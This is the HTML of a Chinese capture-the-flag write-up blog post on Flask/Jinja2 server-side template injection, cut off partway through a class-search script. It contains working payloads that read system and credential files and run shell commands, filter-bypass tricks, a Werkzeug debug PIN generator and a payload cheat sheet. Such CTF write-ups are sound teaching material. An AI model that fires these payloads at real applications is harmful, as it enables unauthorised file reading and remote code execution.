@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="进一步理解flask-sstissti的目的：1.读取文件（LFI,获取secret key 伪造session）2.RCE  BUUOJ FLASK-APP 题目分析先看看提示，提示了PIN 第一种做法：参考链接https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2553简单地说就是flask app 在debug模式下通过terminal显示的pin码可以在报错的时候进入python shell。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="再谈flask-ssti">
+<meta property="og:url" content="https://polosec.github.io/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/index.html">
+<meta property="og:site_name" content="Polo&#39;s Blog">
+<meta property="og:description" content="进一步理解flask-sstissti的目的：1.读取文件（LFI,获取secret key 伪造session）2.RCE  BUUOJ FLASK-APP 题目分析先看看提示，提示了PIN 第一种做法：参考链接https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2553简单地说就是flask app 在debug模式下通过terminal显示的pin码可以在报错的时候进入python shell。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/bypass4.jpg">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/bypass5.jpg">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/bypass1.jpg">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/bypass2.jpg">
+<meta property="article:published_time" content="2020-05-18T07:04:23.000Z">
+<meta property="article:modified_time" content="2020-05-18T08:30:54.474Z">
+<meta property="article:author" content="Polo">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="buuoj">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cdn.polowong.top/static/images/bypass4.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>再谈flask-ssti</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇 " href="/2020/05/22/JSON-JSONP-CSRF/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2020/05/15/%E7%BD%91%E9%BC%8E%E6%9D%AFweb-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://polosec.github.io/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://polosec.github.io/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/&text=再谈flask-ssti"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://polosec.github.io/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/&title=再谈flask-ssti"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://polosec.github.io/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/&is_video=false&description=再谈flask-ssti"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=再谈flask-ssti&body=Check out this article: https://polosec.github.io/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://polosec.github.io/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/&title=再谈flask-ssti"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://polosec.github.io/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/&title=再谈flask-ssti"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://polosec.github.io/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/&title=再谈flask-ssti"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://polosec.github.io/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/&title=再谈flask-ssti"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://polosec.github.io/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/&name=再谈flask-ssti&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://polosec.github.io/2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/&t=再谈flask-ssti"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%90%86%E8%A7%A3flask-ssti"><span class="toc-number">1.</span> <span class="toc-text">进一步理解flask-ssti</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#BUUOJ-FLASK-APP-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">BUUOJ FLASK-APP 题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E5%81%9A%E6%B3%95%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">第一种做法：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E5%81%9A%E6%B3%95"><span class="toc-number">1.1.2.</span> <span class="toc-text">第二种做法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%80%83"><span class="toc-number">1.2.</span> <span class="toc-text">思考</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        再谈flask-ssti
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Polo</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-05-18T07:04:23.000Z" itemprop="datePublished">2020-05-18</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/buuoj/" rel="tag">buuoj</a>, <a class="tag-link-link" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="进一步理解flask-ssti"><a href="#进一步理解flask-ssti" class="headerlink" title="进一步理解flask-ssti"></a>进一步理解flask-ssti</h1><p>ssti的目的：<br>1.读取文件（LFI,获取secret key 伪造session）<br>2.RCE </p>
+<h2 id="BUUOJ-FLASK-APP-题目分析"><a href="#BUUOJ-FLASK-APP-题目分析" class="headerlink" title="BUUOJ FLASK-APP 题目分析"></a>BUUOJ FLASK-APP 题目分析</h2><p>先看看提示，提示了PIN</p>
+<h3 id="第一种做法："><a href="#第一种做法：" class="headerlink" title="第一种做法："></a>第一种做法：</h3><p>参考链接<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2553">https://xz.aliyun.com/t/2553</a><br>简单地说就是flask app 在debug模式下通过terminal显示的pin码可以在报错的时候进入python shell。并且运行应用程序时该pin码不会变。<br>接下来需要知道生成PIN码需要什么。<br>1.当前用户名<br>2.app.py的绝对路径<br>3.model name 一般是flask.app<br>4.app名称 一般是Flask<br>5.网卡十进制数（服务器的，读/sys/class/net/eth0/address）<br>6.machine-id（docker的话需要读取/proc/self/cgroup ，正常Linux读取/etc/machine-id）<br>那么接下来就需要获取这些。<br>首先是app.py的绝对路径，通过报错获得：</p>
+<img src="http://cdn.polowong.top/static/images/bypass4.jpg">
+<p>/usr/local/lib/python3.7/site-packages/flask/app.py<br>然后是当前用户名，有两种方法，我用的是第一种，通过ssti 读文件/etc/passwd 发现用户flaskweb，猜测就是这个用户<br>另一种准确的方法是执行系统命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>这里需要绕过os popen过滤 方法是拼接字符串 用单引号。双引号会失败 不知道为什么<br>看到当前用户是flaskweb。<br>接下来读取网卡十进制与machine-id 由于buuoj是docker环境，所以需要从/proc/self/cgroup读。<br>网卡：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;op&#39;+&#39;en&#39;](&quot;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>02:42:ae:01:5e:21 转十进制不用说了。2485410422305<br>machine-id：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;op&#39;+&#39;en&#39;](&quot;&#x2F;proc&#x2F;self&#x2F;cgroup&quot;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">08220fc28119ede2eeaafa166f633321a5fe013f1a5bd26335d47e595376ccaf</span><br></pre></td></tr></table></figure>
+<p>生成PIN码的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485410422305&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;08220fc28119ede2eeaafa166f633321a5fe013f1a5bd26335d47e595376ccaf&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
+<p>生成出来的PIN 在报错页面点击右面的terminal图标输入进去就好啦，接下来就是愉快的命令执行了~</p>
+<img src="http://cdn.polowong.top/static/images/bypass5.jpg">
+<p>finished.</p>
+<h3 id="第二种做法"><a href="#第二种做法" class="headerlink" title="第二种做法"></a>第二种做法</h3><p>既然知道了是SSTI,WHY NOT RCE DIRECTLY!!</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&#39;o&#39;+&#39;s&#39;][&#39;pop&#39;+&#39;en&#39;](&quot;ls &#x2F;&quot;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&#39;o&#39;+&#39;s&#39;][&#39;pop&#39;+&#39;en&#39;](&quot;sort &#x2F;this_is_the_fla\g.txt&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>这里防止对cat有过滤 直接用的sort。已经知道的过滤是popen，import，flag。os不知道，懒得测试了 直接绕过</p>
+<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>这里我写了几种自己研究和网上学习到的payload</p>
+<img src="http://cdn.polowong.top/static/images/bypass1.jpg">
+<img src="http://cdn.polowong.top/static/images/bypass2.jpg">
+<p>引用资源：<br><strong>dict</strong> 保存类实例或对象实例的属性变量键值对字典<br><strong>class</strong>  返回类型所属的对象<br><strong>mro</strong>    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。<br><strong>bases</strong>   返回该对象所继承的基类<br>// __base__和__mro__都是用来寻找基类的</p>
+<p><strong>subclasses</strong>   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br><strong>init</strong>  类的初始化方法<br><strong>globals</strong>  对包含函数全局变量的字典的引用<br>我思考的：<br>__builtins__里面包括了一些直接拿来用的方法 比如说hex open等。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">python3:</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">177</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/flag&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"><span class="comment">#命令执行：</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"><span class="comment">#文件操作</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 这种不用找类</span><br><span class="line"></span><br><span class="line">当然了 万能的实际用起来可能并不能。。因为一般会过滤 比如这道题的<span class="keyword">import</span> 和 popen都过滤了，RCE的时候万金油不太行了！</span><br><span class="line">python2:</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;  </span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">SSTI关键词（防护用）</span><br><span class="line">[</span><br><span class="line">]</span><br><span class="line">(</span><br><span class="line">\</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">_</span><br><span class="line">__</span><br><span class="line">.</span><br><span class="line">g</span><br><span class="line">&#39;&#39;</span><br><span class="line">&quot;&quot;</span><br><span class="line">request</span><br><span class="line">g</span><br><span class="line">namespace</span><br><span class="line">__dict__</span><br><span class="line">__class__</span><br><span class="line">__mro__</span><br><span class="line">__bases__</span><br><span class="line">__subclasses__</span><br><span class="line">__init__</span><br><span class="line">__globals__</span><br><span class="line">self</span><br><span class="line">config</span><br><span class="line">url_for</span><br><span class="line">get_flashed_messages</span><br><span class="line">lipsum</span><br><span class="line">current_app</span><br><span class="line">range</span><br><span class="line">session</span><br><span class="line">dict</span><br><span class="line">get_flashed_messages</span><br><span class="line">cycler</span><br><span class="line">joiner</span><br><span class="line">__builtins__</span><br><span class="line">__import__</span><br><span class="line">eval</span><br><span class="line">keys</span><br><span class="line">index</span><br><span class="line">values</span><br><span class="line">popen</span><br><span class="line">read</span><br><span class="line">_TemplateReference__context</span><br><span class="line">environ</span><br><span class="line">application</span><br><span class="line">_get_data_for_json</span><br><span class="line">JSONEncoder</span><br><span class="line">default</span><br><span class="line">system</span><br><span class="line">flag</span><br><span class="line">*</span><br><span class="line">?</span><br><span class="line">import</span><br><span class="line">_IterationGuard</span><br><span class="line">catch_warnings</span><br><span class="line">_ModuleLock</span><br><span class="line">flag</span><br><span class="line">chr</span><br><span class="line">subprocess</span><br><span class="line">commands</span><br><span class="line">socket</span><br><span class="line">hex</span><br><span class="line">base64</span><br></pre></td></tr></table></figure>
+<p>找模块脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">num=<span class="number">0</span></span><br><span class="line"><span class="keyword">import</span>  numpy</span><br><span class="line">choice=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;找os1 其他0&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> choice==<span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> [].__class__.__mro__[<span class="number">1</span>].__subclasses__():</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">             <span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> <span class="keyword">in</span> item.__init__.__globals__:</span><br><span class="line">                 <span class="built_in">print</span>(num)</span><br><span class="line">                 <span class="built_in">print</span>(item)</span><br><span class="line"></span><br><span class="line">             num+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            num+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    searchList = [<span class="string">&#x27;__init__&#x27;</span>, <span class="string">&quot;__new__&quot;</span>, <span class="string">&#x27;__del__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__bytes__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__bool__&#x27;</span>, <span class="string">&#x27;__getattr__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__get__&#x27;</span>, <span class="string">&#x27;__set__&#x27;</span>, <span class="string">&#x27;__delete__&#x27;</span>, <span class="string">&#x27;__call__&#x27;</span>, <span class="string">&quot;__instancecheck__&quot;</span>, <span class="string">&#x27;__subclasscheck__&#x27;</span>, <span class="string">&#x27;__len__&#x27;</span>, <span class="string">&#x27;__length_hint__&#x27;</span>, <span class="string">&#x27;__missing__&#x27;</span>,<span class="string">&#x27;__getitem__&#x27;</span>, <span class="string">&#x27;__setitem__&#x27;</span>, <span class="string">&#x27;__iter__&#x27;</span>,<span class="string">&#x27;__delitem__&#x27;</span>, <span class="string">&#x27;__reversed__&#x27;</span>, <span class="string">&#x27;__contains__&#x27;</span>, <span class="string">&#x27;__add__&#x27;</span>, <span class="string">&#x27;__sub__&#x27;</span>,<span class="string">&#x27;__mul__&#x27;</span>]</span><br><span class="line">    neededFunction = [<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    pay = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Payload?[1|0]&quot;</span>))</span><br><span class="line">    <span class="keyword">for</span> index, i <span class="keyword">in</span> <span class="built_in">enumerate</span>(&#123;&#125;.__class__.__base__.__subclasses__()):</span><br><span class="line">        <span class="keyword">for</span> attr <span class="keyword">in</span> searchList:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(i, attr):</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">eval</span>(<span class="string">&#x27;str(i.&#x27;</span>+attr+<span class="string">&#x27;)[1:9]&#x27;</span>) == <span class="string">&#x27;function&#x27;</span>:</span><br><span class="line">                    <span class="keyword">for</span> goal <span class="keyword">in</span> neededFunction:</span><br><span class="line">                        